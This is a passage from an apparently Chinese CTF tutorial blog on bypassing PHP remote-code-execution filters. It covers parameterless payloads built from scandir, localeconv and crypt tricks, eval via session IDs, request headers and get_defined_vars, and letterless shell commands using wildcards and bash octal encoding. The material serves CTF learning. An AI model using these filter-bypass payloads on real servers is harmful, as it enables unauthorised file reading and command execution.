<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=var_dump(scandir(current(localeconv())))</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250307112802088.png" alt="image-20250307112802088"></p>
<p>能正常返回，但是这里为什么第一个和第二个是小数点呢？因为在文件系统中，<code>.</code> 代表当前目录，<code>..</code> 代表父目录。使用 <code>scandir()</code> 函数扫描目录时，会自动包含这两个目录项</p>
<h4 id="方法二：chr-46"><a href="#方法二：chr-46" class="headerlink" title="方法二：chr(46)"></a>方法二：chr(46)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chr(46)`就是字符`&quot;.&quot;</span><br><span class="line">怎么构造46呢？</span><br><span class="line">rand()函数：返回一个随机数</span><br><span class="line">1.chr(rand())//不实际，得看运气</span><br><span class="line">2.chr(time())</span><br><span class="line">chr()函数以256为一个周期，所以chr(46),chr(302),chr(558)都等于&quot;.&quot;。所以使用chr(time())，一个周期必定出现一次&quot;.&quot;</span><br></pre></td></tr></table></figure>

<h4 id="方法三：phpversion-函数"><a href="#方法三：phpversion-函数" class="headerlink" title="方法三：phpversion()函数"></a>方法三：phpversion()函数</h4><p>参考文章：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/157431794">无参数读文件和RCE总结</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这个方法比较撇，所以如果其他方法行不通再用这个方法</span><br><span class="line">phpversion()`返回PHP版本，如`5.5.9</span><br><span class="line">floor(phpversion())返回 5</span><br><span class="line"></span><br><span class="line">sqrt(floor(phpversion()))返回2.2360679774998</span><br><span class="line"></span><br><span class="line">tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615</span><br><span class="line"></span><br><span class="line">cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491</span><br><span class="line"></span><br><span class="line">sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156</span><br><span class="line"></span><br><span class="line">ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46</span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回&quot;.&quot;</span><br></pre></td></tr></table></figure>

<h4 id="方法四：crypt-函数"><a href="#方法四：crypt-函数" class="headerlink" title="方法四：crypt()函数"></a>方法四：crypt()函数</h4><p><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值，第一个字符随机是<code>$</code>(大概率) 或者 <code>&quot;.&quot;</code>(小概率) 然后通过<code>chr(ord())</code>只取第一个字符，ord()函数可以返回字符的ASCII值</p>
<p>所以最后的payload就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(ord(hebrevc(crypt(time()))))));//还是概率事件，多尝试几次</span><br></pre></td></tr></table></figure>

<h3 id="读取当前目录文件"><a href="#读取当前目录文件" class="headerlink" title="读取当前目录文件"></a>读取当前目录文件</h3><p>我们前面成功的返回了目录下的文件名，但是文件是不会直接显示的，所以我们还想需要使用函数去读取文件</p>
<p>前面的方法输出的是数组，文件名是数组的值，那我们要怎么取出想要读取文件的数组呢</p>
<h4 id="操作数组的函数"><a href="#操作数组的函数" class="headerlink" title="操作数组的函数"></a>操作数组的函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">end() ： 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line">next() ：将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() ：将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() ： 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() ： 返回当前元素的键名和键值，并将内部指针向前移动</span><br><span class="line">pos() ： 返回数组中的当前单元, 默认取第一个值</span><br><span class="line">current() ：读取数组的第一个元素</span><br><span class="line">array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">array_slice() 函数在数组中根据条件取出一段值，并返回。</span><br><span class="line">array_reverse() 函数返回翻转顺序的数组。</span><br></pre></td></tr></table></figure>

<h4 id="读取文件的函数"><a href="#读取文件的函数" class="headerlink" title="读取文件的函数"></a>读取文件的函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()[需要查看源代码],highlight_file()、show_source()、readfile()[需要查看源代码]：读取文件内容</span><br><span class="line">readgzfile()也可读文件，常用于绕过过滤</span><br></pre></td></tr></table></figure>

<p>例如在一道题目中有index.php</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250416113012028.png" alt="image-20250416113012028"></p>
<p>是数组的最后一个元素，我们用end()函数，最终的payload就是</p>
<h4 id="end-函数读取最后一个文件"><a href="#end-函数读取最后一个文件" class="headerlink" title="end()函数读取最后一个文件"></a>end()函数读取最后一个文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(end(scandir(current(localeconv()))));</span><br><span class="line">show_source(end(scandir(current(localeconv()))));</span><br><span class="line">readfile(end(scandir(current(localeconv()))));</span><br><span class="line">等都可以</span><br></pre></td></tr></table></figure>

<p>或者我们也可以用array_reverse()函数翻转数组</p>
<h4 id="array-reverse-函数翻转数组"><a href="#array-reverse-函数翻转数组" class="headerlink" title="array_reverse()函数翻转数组"></a>array_reverse()函数翻转数组</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(current(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>如果是第二个我们可以用next移动指针指向第二个</p>
<h4 id="next-函数移动指针"><a href="#next-函数移动指针" class="headerlink" title="next()函数移动指针"></a>next()函数移动指针</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<p>如果不是数组的第一第二个呢？</p>
<h3 id="读取非第一第二文件"><a href="#读取非第一第二文件" class="headerlink" title="读取非第一第二文件"></a>读取非第一第二文件</h3><p>我们可以使用<code>array_rand(array_flip())</code>，<code>array_flip()</code>是交换数组的键和值，<code>array_rand()</code>函数返回数组中的随机键名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(array_rand(array_flip(scandir(current(localeconv())))));//返回文件名</span><br><span class="line">highlight_file(array_rand(array_flip(scandir(current(localeconv())))));//读取文件</span><br></pre></td></tr></table></figure>

<p>（这些读取文件的payload都可以自己结合前面总结的构造<code>&quot;.&quot;</code>的方法切合实际过滤情况读取)</p>
<h3 id="查看上级目录文件名"><a href="#查看上级目录文件名" class="headerlink" title="查看上级目录文件名"></a>查看上级目录文件名</h3><h4 id="方法一：dirname-函数"><a href="#方法一：dirname-函数" class="headerlink" title="方法一：dirname()函数"></a>方法一：dirname()函数</h4><ul>
<li>dirname() 函数返回路径中的目录部分。需要参数</li>
</ul>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">dirname</span>(<span class="string">&#x27;/var/www/1.php&#x27;</span>));</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">/<span class="keyword">var</span>/www</span><br></pre></td></tr></table></figure>

<p>如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径</p>
<p>例如我们题目中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()));</span><br><span class="line">/<span class="keyword">var</span>/www</span><br></pre></td></tr></table></figure>

<p>所以我们如果希望读取上级目录的话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd())));</span><br></pre></td></tr></table></figure>

<h4 id="方法二：构造"><a href="#方法二：构造" class="headerlink" title="方法二：构造.."></a>方法二：构造<code>..</code></h4><p>其实我们在了解scandir函数的时候就知道，<code>scandir()</code> 函数扫描目录时，会自动包含<code>.</code>和<code>..</code>这两个目录项，<code>.</code> 代表当前目录，<code>..</code> 代表父目录，所以我们返回的数组的第二个就是<code>..</code>，那么我们可以使用next()函数操作指针去获取<code>..</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(next(scandir(getcwd())));//返回..</span><br></pre></td></tr></table></figure>

<p>然后我们再用scandir去获取目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(next(scandir(getcwd())));//查看上级目录</span><br></pre></td></tr></table></figure>

<h3 id="读取上级目录文件"><a href="#读取上级目录文件" class="headerlink" title="读取上级目录文件"></a>读取上级目录文件</h3><p>其实是和之前讲的读取目录文件是一样的，只不过我们需要改变当前工作目录为上级目录而已，所以payload有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(next(scandir(getcwd()))))));</span><br></pre></td></tr></table></figure>

<p>但是这里切换路径后<code>getcwd()</code>和<code>localeconv()</code>不能接收参数，因为语法不允许，我们可以用之前的<code>hebrevc(crypt(arg))</code></p>
<p>这里<code>crypt()</code>和<code>time()</code>可以接收参数，于是构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">或更复杂的：</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br><span class="line">还可以用：</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br></pre></td></tr></table></figure>

<h3 id="查看和读取根目录文件"><a href="#查看和读取根目录文件" class="headerlink" title="查看和读取根目录文件"></a>查看和读取根目录文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span><br></pre></td></tr></table></figure>

<p><code>strrev(crypt(serialize(array())))</code>所获得的字符串第一位有几率是<code>/</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>()))))));</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<p>所以使用以上payload可以查看根目录文件</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250416115831819.png" alt="image-20250416115831819"></p>
<p>但是有权限限制，linux系统下需要一定的权限才能读到，所以不一定成功</p>
<p>读根目录文件：(也是需要权限)</p>
<p>和前面的一样，但是同样的对于权限有限制，这个我前几天打TGCTF就碰到这种情况了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array())))))))));</span><br></pre></td></tr></table></figure>

<h3 id="glob伪协议查看文件"><a href="#glob伪协议查看文件" class="headerlink" title="glob伪协议查看文件"></a>glob伪协议查看文件</h3><p><code>glob</code> 伪协议是 PHP 中用于匹配文件路径的一种便捷方式。它基于 <strong>glob 模式</strong>（类似于 shell 中的通配符匹配），可以用来查找符合特定模式的文件或目录。</p>
<p><strong><code>glob</code> 伪协议的基本用法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">glob://&lt;pattern&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>&lt;pattern&gt;</code>**：是一个 glob 模式，用于匹配文件或目录路径。</li>
<li>支持的 glob 通配符：<ul>
<li><code>*</code>：匹配任意数量的字符（包括空字符）。</li>
<li><code>?</code>：匹配单个字符。</li>
<li><code>[...]</code>：匹配指定范围内的字符（如 <code>[a-z]</code> 匹配小写字母）。</li>
<li><code>&#123;a,b,c&#125;</code>：匹配多个模式中的一个（如 <code>&#123;jpg,png,gif&#125;</code> 匹配 <code>jpg</code>、<code>png</code> 或 <code>gif</code>）。</li>
</ul>
</li>
</ul>
<p>用法</p>
<ul>
<li>查找当前目录下的所有 <code>.txt</code> 文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$files = glob(&quot;*.txt&quot;);</span><br><span class="line">print_r($files);</span><br></pre></td></tr></table></figure>

<ul>
<li>使用 <code>glob</code> 伪协议读取匹配的文件内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$pattern = &quot;glob://*.txt&quot;; // 匹配当前目录下的所有 .txt 文件</span><br><span class="line">$files = glob($pattern);</span><br><span class="line">echo $file</span><br></pre></td></tr></table></figure>

<p>拿一道ctf的题目讲一下</p>
<p>web72</p>
<p>目录文件扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">传入</span><br><span class="line">c= ?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br><span class="line">分解一下</span><br><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);//*创建一个DirectoryIterator对象，遍历根目录*</span><br><span class="line"></span><br><span class="line">foreach($a as $f)//*// 遍历每个条目*</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   echo($f-&gt;__toString().&#x27; &#x27;);//*// 输出条目的名称，并添加一个空格*</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exit(0);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="利用session进行无参数RCE"><a href="#利用session进行无参数RCE" class="headerlink" title="利用session进行无参数RCE"></a>利用session进行无参数RCE</h3><p>使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）</p>
<p> 首先我们需要开启session_start()来保证session_id()的使用，session_id可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现</p>
<p>这样的话我们就可以在cookie中设置phpsession为想要读取的文件名，然后payload设置成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">传参readfile(session_id(session_start()));</span><br><span class="line">设置Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="利用请求头进行无参数RE"><a href="#利用请求头进行无参数RE" class="headerlink" title="利用请求头进行无参数RE"></a>利用请求头进行无参数RE</h3><p>getallheaders()返回当前请求的所有请求头信息，如果我们在请求头中写入恶意代码，然后再将指针指向最后一个请求头让他执行，那么也可以达到一个无参数RCE的效果</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/v2-aa4f8adf4e9a6492247feac2129f62a2_1440w.jpg" alt="img"></p>
<p><code>getallheaders()</code>是<code>apache_request_headers()</code>的别名函数，但是该函数只能在<code>Apache</code>环境下使用</p>
<p>如果能返回请求头，接下来利用方式就多了，任何<code>header</code>头部都可利用</p>
<p>当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="name">getallheaders</span>())<span class="comment">;</span></span><br><span class="line">然后在请求包最后一行中加入请求头=phpinfo()<span class="comment">;进行测试</span></span><br><span class="line">eval(<span class="name">pos</span>(<span class="name">getallheaders</span>()))<span class="comment">;</span></span><br><span class="line">因为是倒序的，所以</span><br></pre></td></tr></table></figure>

<h3 id="利用全局变量进行无参数RCE"><a href="#利用全局变量进行无参数RCE" class="headerlink" title="利用全局变量进行无参数RCE"></a>利用全局变量进行无参数RCE</h3><p>get_defined_vars()可以回显全局变量$_GET、$_POST、$_FILES、$_COOKIE</p>
<p>返回数组顺序为$_GET–&gt;$_POST–&gt;$_COOKIE–&gt;$_FILES</p>
<p>假如一个题目中只有一个参数a，我们可以多加一个参数b，然后写入命令执行语句</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>

<p>把eval换成assert也行 ，能执行<code>system(&#39;ls /&#39;)</code>就行</p>
<h2 id="system中无字母RCE"><a href="#system中无字母RCE" class="headerlink" title="system中无字母RCE"></a>system中无字母RCE</h2><p>什么是无字母rce呢，题目代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目只是过滤了字母而没过滤数字，这时候又该怎么绕过呢？</p>
<h3 id="使用-bin目录下的可执行程序"><a href="#使用-bin目录下的可执行程序" class="headerlink" title="使用&#x2F;bin目录下的可执行程序"></a><strong>使用&#x2F;bin目录下的可执行程序</strong></h3><p><strong>base64程序查看flag.php</strong></p>
<p>尝试使用&#x2F;bin目录下的可执行程序。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/base64 flag.php</span><br></pre></td></tr></table></figure>

<p>但是过滤了字母，那么我们用通配符?绕过，下面会详细讲解</p>
<p>替换后变成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br></pre></td></tr></table></figure>

<p>积累题型，最近碰到了一道题，是XYCTF2024的题目，具体代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>

<p>这里给出了白名单，要求我们传入的$cmd参数的每个字符都符合白名单规定的内容，否则就会执行die()语句，这时候我们可以用什么方法呢?</p>
<p>第一个就是bashfuck</p>
<h3 id="bashfuck实现无字母RCE"><a href="#bashfuck实现无字母RCE" class="headerlink" title="bashfuck实现无字母RCE"></a>bashfuck实现无字母RCE</h3><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35251017/article/details/129501373">【bashfuck】bashshell实现无字母命令执行的构造原理</a></p>
<p>其实这里还是有限制的，取决于Linux的系别，在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash</p>
<h4 id="数字编码执行RCE"><a href="#数字编码执行RCE" class="headerlink" title="数字编码执行RCE"></a>数字编码执行RCE</h4><p>首先我们知道，在终端中，<code>$&#39;\xxx&#39;</code>可以将八进制ascii码解析为字符，所以我们可以尝试通过八进制将我们的命令进行转码去绕过字母或者关键字的限制</p>
<p>根据<strong>Bash 的 <code>$&#39;...&#39;</code> ANSI-C Quoting 机制</strong>，<code>$&#39;...&#39;</code> 会在 <strong>Shell 解析阶段</strong>（执行命令前）把 <code>\xxx</code>（八进制）转换成 <strong>对应的 ASCII 字符</strong>。所有 <strong><code>$&#39;\xxx&#39;</code> 拼接后</strong>，最终会合并为 <strong>可执行的 Shell 命令</strong></p>
<p>我们终端测试一下</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250403184929665.png" alt="image-20250403184929665"></p>
<p><code>\154\163</code>是<code>ls</code>的八进制表示。</p>
<p>但是注意，如果为连续的一串<code>$&#39;\xxx\xxx\xxx\xxx&#39;</code>形式，则我们无法执行带参数的命令。这是为什么呢？</p>
<p>Shell 仅将 <code>$&#39;\xxx\xxx...&#39;</code> 视为 <strong>单字符串（一个参数）</strong>，而不是 <strong>可执行命令</strong>，它并不会对参数进行分割，在Bash中，单词分割是一种将参数扩展、命令替换和算术扩展的结果分割成多个单词的过程，它发生在双引号之外，并且受到IFS变量的影响。</p>
<p>如果一个字符串包含空格或其他IFS字符，它会被分割成多个单词，每个单词作为一个独立的参数传递给命令。</p>
<p>但因为八进制转义序列是在命令行解析之前就执行的，所以它不会触发单词分割</p>
<p>然后我们再来关注一下Linux Bash Shell的Here string语法</p>
<h4 id="Linux-Bash-Shell的Here-string语法"><a href="#Linux-Bash-Shell的Here-string语法" class="headerlink" title="Linux Bash Shell的Here string语法"></a>Linux Bash Shell的Here string语法</h4><p>在 Bash Shell 中，<strong>Here String</strong>（<code>&lt;&lt;&lt;</code>）是一种将 <strong>单行字符串</strong> 标准输入（stdin）传递给命令的方法。</p>
<p>基本语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command &lt;&lt;&lt; &quot;STRING&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;&lt;&lt;</code>：Here String 操作符</li>
<li><code>&quot;STRING&quot;</code>：要传递给 <code>command</code> 的输入内容</li>
</ul>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;&lt; &quot;hello&quot;   # 相当于 echo &quot;hello&quot; | cat</span><br></pre></td></tr></table></figure>

<p>然后我们需要关注另一个点，就是<code>$0</code>变量</p>
<h4 id="0变量"><a href="#0变量" class="headerlink" title="$0变量"></a><code>$0</code>变量</h4><p><code>$0</code> 是一个特殊的变量，表示当前正在执行的脚本(或者是当前的 shell)的文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/var/www/html# echo $0</span><br><span class="line">bash</span><br></pre></td></tr></table></figure>

<p>然后是 &lt;&lt;&lt; ，是一种操作符，用于将字符串作为输入传递给命令</p>
<ul>
<li><code>&lt;&lt;&lt;</code> 是 <strong>Here String</strong> 语法，可以将字符串直接传递给命令的标准输入（stdin）。</li>
</ul>
<p>所以我们试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/var/www/html# $0&lt;&lt;&lt;&#x27;id&#x27;</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p>这里的命令就相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;id&#x27; | $0</span><br></pre></td></tr></table></figure>

<p>如果<code>$0</code>是<code>/bin/bash</code>，那么就会尝试执行这个命令</p>
<p>那我们试着执行命令ls</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$0&lt;&lt;&lt;$%27\154\163\040\057%27</span><br><span class="line">等价于</span><br><span class="line">echo &#x27;ls /&#x27; | /bin/bash</span><br></pre></td></tr></table></figure>

<p>如果 <code>bash</code> 读取标准输入时自动解析 <code>\</code> 转义，才会触发命令执行漏洞，其实这里还取决于服务器的shell配置</p>
<p>但是这里是在终端去进行测试的，在终端中<code>$0</code>其实就是bash本身，但是在环境中我们往往需要寻找如何构造<code>$0</code>，或者说有些题目如果过滤了0，该如何构造0</p>
<h4 id="构造-0"><a href="#构造-0" class="headerlink" title="构造$0"></a>构造$0</h4><p>我们可以使用变量赋值，或者特殊变量构造</p>
<ul>
<li><code>$&#123;#&#125;</code>表示接受参数个数，在终端中参数为空 值为 0</li>
